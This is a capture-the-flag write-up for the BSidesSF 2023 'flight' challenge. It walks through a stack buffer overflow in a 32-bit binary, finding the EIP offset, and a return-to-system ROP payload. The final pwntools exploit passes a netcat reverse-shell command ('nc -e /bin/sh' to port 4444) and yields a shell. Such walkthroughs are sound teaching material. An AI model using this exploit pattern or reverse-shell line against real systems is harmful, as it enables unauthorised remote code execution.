# Summary

Flight is a binary exploitation challenge which acts as a navigation computer for a spaceship. The final prompt is vulnerable to a buffer overflow. Since the binary has DEP enabled, ROP must be used to make a call to `system` and get a reverse shell. Since ASLR isn't enabled, the address for the `destination` variable, which is controlled by the user, can be determined before runtime and will act as the parameter to `system`. 

# Reverse Engineering

Launching the program, we can see that it is prompting us for a password.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ ./flight
Welcome to the ISS Destructor navigation computer
Please enter the password
> 

```

Running `strings` on the binary, we can find a possible candidate for the password.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ strings flight
/lib/ld-linux.so.2
_IO_stdin_used
__libc_start_main

...

Welcome to the ISS Destructor navigation computer
Please enter the password
%40s
73f46e5e-7c23-11ed-a1eb-0242ac120002
Are you ready to take off? (Y/N)
Where would you like to go?

...

```

Let's try entering `73f46e5e-7c23-11ed-a1eb-0242ac120002` as the password.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ ./flight
Welcome to the ISS Destructor navigation computer
Please enter the password
> 73f46e5e-7c23-11ed-a1eb-0242ac120002
Password accepted
Are you ready to take off? (Y/N)
> 

```

Excellent, our password was accepted, now we can run the program as intended. 

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ ./flight
Welcome to the ISS Destructor navigation computer
Please enter the password
> 73f46e5e-7c23-11ed-a1eb-0242ac120002
Password accepted
Are you ready to take off? (Y/N)
> Y
Where would you like to go?
> asdf
Beginning journey to asdf
You have arrived at asdf
Would you like to land or continue flying? (land/continue)
> continue
Where would you like to go?
> test
Beginning journey to test
You have arrived at test
Would you like to land or continue flying? (land/continue)
> land
Landing at test
The local time is: Tue Dec 20 05:18:15 PM CST 2022
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ 
```

Let's take a look at the decompiled code in Ghidra and look for a buffer overflow.

```c
1 void main(void)
2 
3 {
4   run();
5   return;
6 }
```

Starting with the `main` function, we see that it only makes a call to the `run` function.

```c
 1 undefined4 run(void)
 2 
 3 {
 4   int iVar1;
 5   char *__s;
 6   undefined4 extraout_EDX;
 7   
 8   setbuf(stdout,(char *)0x0);
 9   iVar1 = authenticate();
10   if (iVar1 == 0) {
11     __s = "Incorrect password";
12   }
13   else {
14     puts("Password accepted");
15     iVar1 = promptForTakeOff();
16     if (iVar1 != 0) {
17       do {
18         takeOff();
19         printf("You have arrived at %s\n",destination,extraout_EDX,extraout_EDX);
20         iVar1 = promptToLand();
21       } while (iVar1 == 0);
22       printf("Landing at %s\nThe local time is: ",destination,iVar1,iVar1);
23       system("date");
24       return 0;
25     }
26     __s = "OK, maybe next time";
27   }
28   puts(__s);
29   return 1;
30 }
```

Inside the `run` function, we see a lot of user defined functions being called. Taking a look at the `takeOff` function, we can see that the data requested from the user is stored in the `destination` variable.

```c
1 void takeOff(void)
2 
3 {
4   printf("Where would you like to go?\n> ");
5   __isoc99_scanf("%100s",destination);
6   printf("Beginning journey to %s\n",destination);
7   return;
8 }
9 
```

This will be useful for later.

Taking a look at the `promptToLand` function, we can see that the call to `scanf` does not define how many bytes it should read.

```c
 1 bool promptToLand(void)
 2 
 3 {
 4   int iVar1;
 5   int iVar2;
 6   char local_80 [108];
 7   undefined4 uStack20;
 8   
 9   uStack20 = 0x80492dd;
10   do {
11     printf("Would you like to land or continue flying? (land/continue)\n> ");
12     __isoc99_scanf(&DAT_0804a129,local_80);
13     iVar1 = strcmp(local_80,"land");
14     if (iVar1 == 0) break;
15     iVar2 = strcmp(local_80,"continue");
16   } while (iVar2 != 0);
17   return iVar1 == 0;
18 }
```

```default
                             DAT_0804a129                                    XREF[2]:     promptToLand:080492ef(*), 
                                                                                          promptToLand:0804930f(*)  
        0804a129 25              ??         25h    %
        0804a12a 73              ??         73h    s
        0804a12b 00              ??         00h

```

This makes it potentially vulnerable to a buffer overflow. That being said, in order to escape the while loop and return from the function, we need the call to `strcmp` to evaluate to 0. This means our payload will have to start with either 'land' or 'continue' followed by a null byte, and then the rest of our payload.

Let's write a Python script that causes a segmentation fault. First, we'll set up the environment.

```python
from pwn import *
import os

context(terminal=['tmux', 'new-window'])

p = process('../distfiles/flight')

gdb.attach(p)
```

Next, we'll go through the execution of the program and send the buffer overflow payload at the end.

```python
print(p.recvuntil("password"))

p.sendline("73f46e5e-7c23-11ed-a1eb-0242ac120002");

print(p.recvuntil("(Y/N)"))

p.sendline("Y")

print(p.recvuntil("go?"))

p.sendline("AAAA")

print(p.recvuntil("(land/continue)"))


p.sendline(b"continue"+b"\x00"+b"A"*1000)

p.interactive()
```

After running the script, we can see that we get a segmentation fault.

```default
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xff947430 ('A' <repeats 200 times>...)
0004| 0xff947434 ('A' <repeats 200 times>...)
0008| 0xff947438 ('A' <repeats 200 times>...)
0012| 0xff94743c ('A' <repeats 200 times>...)
0016| 0xff947440 ('A' <repeats 200 times>...)
0020| 0xff947444 ('A' <repeats 200 times>...)
0024| 0xff947448 ('A' <repeats 200 times>...)
0028| 0xff94744c ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 

```

Excellent, let's now swap our payload for a non repeating pattern so that we can figure out the offset for the `eip`.


```default
gdb-peda$ pattern_create 1000
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$x'
gdb-peda$ 
```

```python
p.sendline(b"continue"+b"\x00"+b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$x')
```

Now we can run the script and get the offset

```default
ESP: 0xffa783c0 ("9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA"...)
EIP: 0x41416a41 ('AjAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416a41
[------------------------------------stack-------------------------------------]
0000| 0xffa783c0 ("9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA"...)
0004| 0xffa783c4 ("AAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%"...)
0008| 0xffa783c8 ("APAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%k"...)
0012| 0xffa783cc ("lAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA"...)
0016| 0xffa783d0 ("AAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%"...)
0020| 0xffa783d4 ("ARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%m"...)
0024| 0xffa783d8 ("oAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA"...)
0028| 0xffa783dc ("AApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416a41 in ?? ()
gdb-peda$ pattern_offset AjAA
AjAA found at offset: 119
gdb-peda$ 
```

Let's update our script and confirm that we have control of the `eip`.

```python
p.sendline(b"continue"+b"\x00"+b"A"*119+"B"*4)
```

```default
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xff9f89d0 --> 0x804a100 ("d or continue flying? (land/continue)\n> ")
0004| 0xff9f89d4 --> 0x804b4e0 ("AAAA")
0008| 0xff9f89d8 --> 0xf7ecb5c0 (0xf7ecb5c0)
0012| 0xff9f89dc --> 0xf7ecb5c0 (0xf7ecb5c0)
0016| 0xff9f89e0 --> 0xff9f8a20 --> 0xf7ea0ff4 --> 0x21cd8c 
0020| 0xff9f89e4 --> 0xf7eca708 --> 0xf7f06bac --> 0xf7eca820 --> 0xf7f06a40 --> 0x0 
0024| 0xff9f89e8 --> 0x8049369 (<run+11>:       add    ebx,0x210b)
0028| 0xff9f89ec --> 0xf7ea0ff4 --> 0x21cd8c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

Excellent, we now have control of the `eip`.

Since ASLR is disabled, let's disassemble the `run` function and get the address for the `system` function which we will be returning to.

```default
gdb-peda$ disas run
Dump of assembler code for function run:
   0x0804935e <+0>:     push   ebp
   0x0804935f <+1>:     mov    ebp,esp
   0x08049361 <+3>:     push   edi

...

   0x08049403 <+165>:   lea    eax,[ebx-0x12c7]
   0x08049409 <+171>:   mov    DWORD PTR [esp],eax
   0x0804940c <+174>:   call   0x8049080 <system@plt>
   0x08049411 <+179>:   add    esp,0x10
   0x08049414 <+182>:   xor    eax,eax
   0x08049416 <+184>:   lea    esp,[ebp-0xc]
   0x08049419 <+187>:   pop    ebx
   0x0804941a <+188>:   pop    esi
   0x0804941b <+189>:   pop    edi
   0x0804941c <+190>:   pop    ebp
   0x0804941d <+191>:   ret
End of assembler dump.
gdb-peda$ 
```

Next, we can get the address of the `destination` variable using the `objdump` command.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$ objdump -t flight

flight:     file format elf32-i386

SYMBOL TABLE:
00000000 l    df *ABS*  00000000              crt1.o
080481ac l     O .note.ABI-tag  00000020              __abi_tag
00000000 l    df *ABS*  00000000              main.c

...

08049420 g     F .fini  00000000              .hidden _fini
0804b4e0 g     O .bss   00000064              destination
0804b49c g       .data  00000000              __data_start

...

0804b4a4 g     O .data  00000000              .hidden __TMC_END__
08049000 g     F .init  00000000              .hidden _init


┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/distfiles]
└─━ [*]$
```

Finally, we can specify the command we want to run when asked for a destination and write our final payload.

```python
print(p.recvuntil("password"))

p.sendline("73f46e5e-7c23-11ed-a1eb-0242ac120002");

print(p.recvuntil("(Y/N)"))

p.sendline("Y")

print(p.recvuntil("go?"))

p.sendline("nc${IFS}-e${IFS}/bin/sh${IFS}127.0.0.1${IFS}4444")

print(p.recvuntil("(land/continue)"))


p.sendline(b"continue"+b"\x00"+b"A"*119+b"\x80\x90\x04\x08"+b"\xe0\xb4\x04\x08"*4)

p.interactive()
```

Now we can run the exploit and get our reverse shell.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight/solution]
└─━ [*]$ python3 exploit2.py                                             
[+] Starting local process '../distfiles/flight': pid 20232
[*] running in new terminal: ['/usr/bin/gdb', '-q', '../distfiles/flight', '20232']
[+] Waiting for debugger: Done 
...
```

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/flight]
└─━ [*]$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42670
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner)

```

